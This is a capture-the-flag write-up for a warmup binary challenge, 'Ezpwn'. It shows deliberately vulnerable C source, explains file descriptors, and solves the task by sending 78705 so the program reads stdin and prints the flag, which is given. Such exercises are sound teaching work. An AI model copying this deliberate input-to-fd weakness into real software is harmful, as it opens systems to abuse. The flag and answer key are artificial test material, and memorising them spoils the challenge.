# Ezpwn 

Difficulty Level: Warmup
 
Yay! Finally getting to do some exploiting! Make it concatenate the flag file
 
Connect via `nc challenge.ctf-fun.xyz 14003`
 
PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- Check out what [read](https://man7.org/linux/man-pages/man2/read.2.html) is about, particularly on how to get input from [STanDard INput](https://www.geeksforgeeks.org/input-output-system-calls-c-create-open-close-read-write/)
P.S: You might need to convert the hexadecimal (0x123) to decimal


## Deployment

```bash
cd service
sudo ./ezpwn.sh &
```

## Solution

#### Quick intro to file descriptors
File descriptors simply are indicators or handles used to access a file or i/o (input/output) resource , File descriptors are represented in C as integers and there are 3 types of file descriptors :
| Descriptor               | Value |
| ------------------------ | ----- |
| standard input (stdin)   | 0     |
| standard output (stdout) | 1     | 
| standard error (stderr)  | 2     |

We are given the source code as well as the compiled binary for this challenge.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc){
    char buf[32] = {0x00};
    int number = 0x00;

    setbuf(stdout, NULL);

    printf("Number? ");
    scanf("%d", &number);

    int fd = number - 0x13371;
    int len = read(fd, buf, 32);

    if (!strcmp("GIVEFLAGPLS\n", buf)) {
        system("/bin/cat flag.txt");
        exit(0);
    }

    return 0;
}
```
The first portion asks for a number which saves to `number`
```c
printf("Number? ");
scanf("%d", &number)
```
It then tries to read with file descriptor `fd`
```c
int fd = number - 0x13371;
int len = read(fd, buf, 32);
```

We then see that `buf` variable needs to match `GIVEFLAGPLS\n` to print the flag.
```c
if (!strcmp("GIVEFLAGPLS\n", buf)) {
    system("/bin/cat flag.txt");
    exit(0);
}
```
In order to be able to write to `buf` we need to ensure `fd` is set to 0 so that `read(fd, buf, 32)` will read from **stdin**. Thus we need to provide a **decimal** number equal to `0x13371`, this can be simply found by typing it in the programmer mode of window's calculator which we get `78705`.

```bash
nc challenge.ctf-fun.xyz 14003

Number? 78705
GIVEFLAGPLS
19C4{d35cr1b3_f1l3_1n_0n3_1n7363r}
```
### Flag
19C4{d35cr1b3_f1l3_1n_0n3_1n7363r}